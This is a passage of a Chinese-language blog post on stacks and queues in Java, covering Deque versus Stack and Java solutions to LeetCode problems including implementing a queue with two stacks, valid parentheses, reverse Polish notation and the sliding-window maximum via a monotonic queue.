        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>队列是先进先出，栈是先进后出。<br><img src="/2024/10/22/algorithm/stackandqueue/image.png"></p><p>在Java中，栈（Stack）和队列（Queue）也是非常重要的数据结构，它们在Java集合框架中有着各自的实现和应用。让我们深入了解一下Java中的栈和队列的实现及其特点。</p><h3 id="Java中的栈（Stack）"><a href="#Java中的栈（Stack）" class="headerlink" title="Java中的栈（Stack）"></a>Java中的栈（Stack）</h3><p>Java中的<code>Stack</code>类实现了一个后进先出（LIFO）的数据结构。它继承自<code>Vector</code>，提供了允许数据从栈顶添加和移除的方法。然而，由于<code>Stack</code>类是基于<code>Vector</code>实现的，这导致它在多线程环境下并不安全，且性能不是最优的。因此，推荐使用更现代的数据结构，如<code>Deque</code>接口。</p><p>主要方法：</p><ul><li><code>push(E item)</code>: 将元素添加到栈顶。</li><li><code>pop()</code>: 移除栈顶元素并返回该元素。</li><li><code>peek()</code>: 返回栈顶元素但不移除。</li><li><code>empty()</code>: 检查栈是否为空。</li><li><code>search(Object o)</code>: 返回对象在栈中的位置，以1为基底。</li></ul><h3 id="Java中的队列（Queue）"><a href="#Java中的队列（Queue）" class="headerlink" title="Java中的队列（Queue）"></a>Java中的队列（Queue）</h3><p>在Java中，<code>Queue</code>接口定义了队列的基本操作。队列通常是先进先出（FIFO）的，但特定类型的队列如优先队列（PriorityQueue）则根据元素的自然顺序或比较器来决定元素的出队顺序。</p><p>实现类：</p><ul><li><strong>LinkedList</strong>: 实现了<code>Queue</code>接口，提供了标准的队列操作。它允许元素为<code>null</code>。</li><li><strong>PriorityQueue</strong>: 一个基于优先堆的无界队列，元素根据其自然顺序或比较器进行排序。</li><li><strong>ArrayDeque</strong>: 如果你不需要线程安全性，<code>ArrayDeque</code>是比<code>LinkedList</code>更高效的双端队列（Deque）实现。</li></ul><p>主要方法：</p><ul><li><code>add(E e)</code>: 将元素添加到队列尾部。如果成功，返回<code>true</code>；如果没有空间，则抛出<code>IllegalStateException</code>。</li><li><code>offer(E e)</code>: 将元素添加到队列尾部，如果队列已满，则返回<code>false</code>。</li><li><code>remove()</code>: 移除队列头的元素。如果队列为空，则抛出<code>NoSuchElementException</code>。</li><li><code>poll()</code>: 移除并返回队列头部的元素。如果队列为空，则返回<code>null</code>。</li><li><code>element()</code>: 返回队列头部的元素但不移除。如果队列为空，则抛出<code>NoSuchElementException</code>。</li><li><code>peek()</code>: 返回队列头部的元素但不移除。如果队列为空，则返回<code>null</code>。</li></ul><p>推荐使用<br>对于多数需要使用栈的场景，Java官方推荐使用<code>ArrayDeque</code>。它比<code>Stack</code>类更快，因为<code>ArrayDeque</code>是循环数组的形式实现的，这使得它在不涉及线程安全的环境中具有更高的性能。同样的，对于队列操作，<code>ArrayDeque</code>也是一个优良的选择，尤其是当你需要一个同时支持栈和队列操作的高效数据结构时。</p><h2 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232.用栈实现队列"></a>232.用栈实现队列</h2><p>请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：</p><p>实现 MyQueue 类：<br>void push(int x) 将元素 x 推到队列的末尾<br>int pop() 从队列的开头移除并返回元素<br>int peek() 返回队列开头的元素<br>boolean empty() 如果队列为空，返回 true ；否则，返回 false</p><p>说明：<br>你 只能 使用标准的栈操作 —— 也就是只有 push to top, peek&#x2F;pop from top, size, 和 is empty 操作是合法的。<br>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyQueue</span>();</span><br><span class="line">queue.push(<span class="number">1</span>);</span><br><span class="line">queue.push(<span class="number">2</span>);</span><br><span class="line">queue.peek();  <span class="comment">// 返回 1</span></span><br><span class="line">queue.pop();   <span class="comment">// 返回 1</span></span><br><span class="line">queue.empty(); <span class="comment">// 返回 false</span></span><br></pre></td></tr></table></figure><p>使用栈来模拟队列的行为，如果仅仅用一个栈，是一定不行的，所以需要两个栈一个输入栈，一个输出栈，这里要注意输入栈和输出栈的关系。<br>在push数据的时候，只要数据放进输入栈就好，但在pop的时候，操作就复杂一些，输出栈如果为空，就把进栈数据全部导入进来（注意是全部导入），再从出栈弹出数据，如果输出栈不为空，则直接从出栈弹出数据就可以了。<br>最后如何判断队列为空呢？如果进栈和出栈都为空的话，说明模拟的队列为空了。<br>在代码实现的时候，会发现pop() 和 peek()两个函数功能类似，代码实现上也是类似的，可以思考一下如何把代码抽象一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Integer&gt; stackIn;</span><br><span class="line">    Stack&lt;Integer&gt; stackOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stackIn = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;(); <span class="comment">// 负责进栈</span></span><br><span class="line">        stackOut = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;(); <span class="comment">// 负责出栈</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        stackIn.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stackIn.isEmpty() &amp;&amp; stackOut.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果stackOut为空，那么将stackIn中的元素全部放到stackOut中</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpstackIn</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!stackOut.isEmpty()) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stackIn.isEmpty())&#123;</span><br><span class="line">            stackOut.push(stackIn.pop());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225. 用队列实现栈"></a>225. 用队列实现栈</h2><p>请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p><p>实现 MyStack 类：<br>void push(int x) 将元素 x 压入栈顶。<br>int pop() 移除并返回栈顶元素。<br>int top() 返回栈顶元素。<br>boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。</p><p>注意：<br>你只能使用队列的标准操作 —— 也就是 push to back、peek&#x2F;pop from front、size 和 is empty 这些操作。<br>你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>队列模拟栈，其实一个队列就够了，一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外） 重新添加到队列尾部，此时再去弹出元素就是栈的顺序了。<br>但题目要求两个队列模拟，队列是先进先出的规则，把一个队列中的数据导入另一个队列中，数据的顺序并没有变，并没有变成先进后出的顺序。<br>所以用栈实现队列， 和用队列实现栈的思路还是不一样的，这取决于这两个数据结构的性质。<br>但是依然还是要用两个队列来模拟栈，只不过没有输入和输出的关系，而是另一个队列完全用来备份的！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">    Queue&lt;Integer&gt; queue1;</span><br><span class="line">    Queue&lt;Integer&gt; queue2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">        queue1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        queue2.offer(x); <span class="comment">// 先放在辅助队列中</span></span><br><span class="line">        <span class="keyword">while</span>(!queue1.isEmpty())&#123;</span><br><span class="line">            queue2.offer(queue1.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;Integer&gt; queueTemp;</span><br><span class="line">        queueTemp = queue1;</span><br><span class="line">        queue1 = queue2;</span><br><span class="line">        queue2 = queueTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a>20. 有效的括号</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：<br>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。<br>每个右括号都有一个对应的相同类型的左括号。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Deque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(); <span class="comment">// Deque 用双端队列解决 Queue 是java中的普通队列</span></span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (deque.isEmpty() || deque.peek() != ch)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                deque.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deque.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1047-删除字符串中的所有相邻重复项"><a href="#1047-删除字符串中的所有相邻重复项" class="headerlink" title="1047. 删除字符串中的所有相邻重复项"></a>1047. 删除字符串中的所有相邻重复项</h2><p>给出由小写字母组成的字符串 s，重复项删除操作会选择两个相邻且相同的字母，并删除它们。<br>在 s 上反复执行重复项删除操作，直到无法继续删除。<br>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p><p>输入：”abbaca”<br>输出：”ca”<br>解释：<br>例如，在 “abbaca” 中，我们可以删除 “bb” 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 “aaca”，其中又只有 “aa” 可以执行重复项删除操作，所以最后的字符串为 “ca”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeDuplicates</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//ArrayDeque会比LinkedList在除了删除元素这一点外会快一点</span></span><br><span class="line">        <span class="comment">//参考：https://stackoverflow.com/questions/6163166/why-is-arraydeque-better-than-linkedlist</span></span><br><span class="line">        ArrayDeque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(deque.isEmpty() || deque.peek() != ch)&#123;</span><br><span class="line">                deque.push(ch);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                deque.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            str = deque.pop() + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a>150. 逆波兰表达式求值</h2><p>给你一个字符串数组 tokens ，表示一个根据 逆波兰表示法 表示的算术表达式。<br>请你计算该表达式。返回一个表示表达式值的整数。</p><p>注意：<br>有效的算符为 ‘+’、’-‘、’*’ 和 ‘&#x2F;‘ 。<br>每个操作数（运算对象）都可以是一个整数或者另一个表达式。<br>两个整数之间的除法总是 向零截断 。<br>表达式中不含除零运算。<br>输入是一个根据逆波兰表示法表示的算术表达式。<br>答案及所有中间计算结果可以用 32 位 整数表示。</p><p>示例 1：<br>输入：tokens &#x3D; [“2”,”1”,”+”,”3”,”*”]<br>输出：9<br>解释：该算式转化为常见的中缀算术表达式为：((2 + 1) * 3) &#x3D; 9<br>示例 2：</p><p>输入：tokens &#x3D; [“4”,”13”,”5”,”&#x2F;“,”+”]<br>输出：6<br>解释：该算式转化为常见的中缀算术表达式为：(4 + (13 &#x2F; 5)) &#x3D; 6<br>示例 3：</p><p>输入：tokens &#x3D; [“10”,”6”,”9”,”3”,”+”,”-11”,”<em>“,”&#x2F;“,”</em>“,”17”,”+”,”5”,”+”]<br>输出：22<br>解释：该算式转化为常见的中缀算术表达式为：<br>  ((10 * (6 &#x2F; ((9 + 3) * -11))) + 17) + 5<br>&#x3D; ((10 * (6 &#x2F; (12 * -11))) + 17) + 5<br>&#x3D; ((10 * (6 &#x2F; -132)) + 17) + 5<br>&#x3D; ((10 * 0) + 17) + 5<br>&#x3D; (0 + 17) + 5<br>&#x3D; 17 + 5<br>&#x3D; 22</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>其实逆波兰表达式相当于是二叉树中的后序遍历。 大家可以把运算符作为中间节点，按照后序遍历的规则画出一个二叉树。但我们没有必要从二叉树的角度去解决这个问题，只要知道逆波兰表达式是用后序遍历的方式把二叉树序列化了，就可以了。<br>进一步看，本题中每一个子表达式要得出一个结果，然后拿这个结果再进行运算，那么这岂不就是一个相邻字符串消除的过程，和1047.删除字符串中的所有相邻重复项 (opens new window)中的对对碰游戏是不是就非常像了。</p><p>我们习惯看到的表达式都是中缀表达式，因为符合我们的习惯，但是中缀表达式对于计算机来说就不是很友好了。<br>例如：4 + 13 &#x2F; 5，这就是中缀表达式，计算机从左到右去扫描的话，扫到13，还要判断13后面是什么运算符，还要比较一下优先级，然后13还和后面的5做运算，做完运算之后，还要向前回退到 4 的位置，继续做加法，你说麻不麻烦！<br>那么将中缀表达式，转化为后缀表达式之后：[“4”, “13”, “5”, “&#x2F;“, “+”] ，就不一样了，计算机可以利用栈来顺序处理，不需要考虑优先级了。也不用回退了， 所以后缀表达式对计算机来说是非常友好的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        <span class="keyword">for</span>(String s : tokens)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;+&quot;</span>.equals(s))&#123;<span class="comment">// leetcode 内置jdk的问题，不能使用==判断字符串是否相等</span></span><br><span class="line">                stack.push(stack.pop() + stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>.equals(s))&#123;</span><br><span class="line">                stack.push(-stack.pop() + stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;/&quot;</span>.equals(s))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp1</span> <span class="operator">=</span> stack.pop(); </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                stack.push(temp2 / temp1);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;*&quot;</span>.equals(s))&#123;</span><br><span class="line">                stack.push(stack.pop() * stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                stack.push(Integer.valueOf(s));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Java 中使用 <code>Deque</code>（双端队列）代替传统的 <code>Stack</code> 类来实现堆栈操作（如在解析逆波兰表达式的例子中所示）有几个原因：</p><ol><li><strong>性能更优</strong>：Java 官方文档推荐使用 <code>ArrayDeque</code> 作为栈，因为相比于 <code>Stack</code> 类，<code>ArrayDeque</code> 有更好的性能。<code>Stack</code> 继承自 <code>Vector</code>，后者是一个同步的集合类，因此每个操作都涉及锁定和解锁，这在多数情况下会导致不必要的性能开销。而 <code>ArrayDeque</code> 则没有这些额外的开销，因为它不是线程安全的。</li><li><strong>更加现代和灵活</strong>：<code>Stack</code> 类是早期 Java 版本中的一个遗留类，而 <code>Deque</code> 接口及其实现类（如 <code>LinkedList</code> 和 <code>ArrayDeque</code>）则是 Java 集合框架的一部分，提供了更多的功能和灵活性。例如，<code>Deque</code> 支持在两端插入和移除元素，使其不仅可以作为栈使用，还可以作为队列使用。</li><li><strong>更好的接口设计</strong>：<code>Deque</code> 接口提供了一组更为一致和完整的方法来操作数据，这使得代码更容易理解和维护。例如，使用 <code>push</code>、<code>pop</code> 和 <code>peek</code> 方法来模拟传统的栈操作。</li></ol><h2 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239. 滑动窗口最大值"></a>239. 滑动窗口最大值</h2><p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。<br>返回 滑动窗口中的最大值 。</p><p>示例 1：<br>输入：nums &#x3D; [1,3,-1,-3,5,3,6,7], k &#x3D; 3<br>输出：[3,3,5,5,6,7]<br>解释：<br>滑动窗口的位置                最大值</p><hr><p>[1  3  -1] -3  5  3  6  7       3<br> 1 [3  -1  -3] 5  3  6  7       3<br> 1  3 [-1  -3  5] 3  6  7       5<br> 1  3  -1 [-3  5  3] 6  7       5<br> 1  3  -1  -3 [5  3  6] 7       6<br> 1  3  -1  -3  5 [3  6  7]      7</p><p>示例 2：<br>输入：nums &#x3D; [1], k &#x3D; 1<br>输出：[1]</p><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>有的同学可能会想用一个大顶堆（优先级队列）来存放这个窗口里的k个数字，这样就可以知道最大的最大值是多少了， 但是问题是这个窗口是移动的，而大顶堆每次只能弹出最大值，我们无法移除其他数值，这样就造成大顶堆维护的不是滑动窗口里面的数值了。所以不能用大顶堆。<br>这道题正确的思路是应用单调队列解决，队列没有必要维护窗口里的所有元素，只需要维护有可能成为窗口里最大值的元素就可以了，同时保证队列里的元素数值是由大到小的。<br>对于窗口里的元素{2, 3, 5, 1 ,4}，单调队列里只维护{5, 4} 就够了，保持单调队列里单调递减，此时队列出口元素就是窗口里最大元素。</p><p>此时大家应该怀疑单调队列里维护着{5, 4} 怎么配合窗口进行滑动呢？设计单调队列的时候，pop，和push操作要保持如下规则：</p><ol><li>pop(value)：如果窗口移除的元素value等于单调队列的出口元素，那么队列弹出元素，否则不用任何操作</li><li>push(value)：如果push的元素value大于入口元素的数值，那么就将队列入口的元素弹出，直到push元素的数值小于等于队列入口元素的数值为止</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解法一，自定义数组</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span>&#123;</span><br><span class="line">    Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 弹出元素时，比较弹出的数值是否等于队列出口的数值，如果相等则弹出</span></span><br><span class="line">        <span class="comment">// 同时判断队列当前是否为空</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">poll</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!deque.isEmpty() &amp;&amp; val == deque.peek())&#123;</span><br><span class="line">            deque.poll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加元素时，如果要添加的元素大于入口处的元素，就将入口元素弹出</span></span><br><span class="line">    <span class="comment">//保证队列元素单调递减</span></span><br><span class="line">    <span class="comment">//比如此时队列元素3,1，2将要入队，比1大，所以1弹出，此时队列：3,2</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; val &gt; deque.getLast())&#123;</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">        deque.add(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//队列队顶元素始终为最大值</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> deque.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> 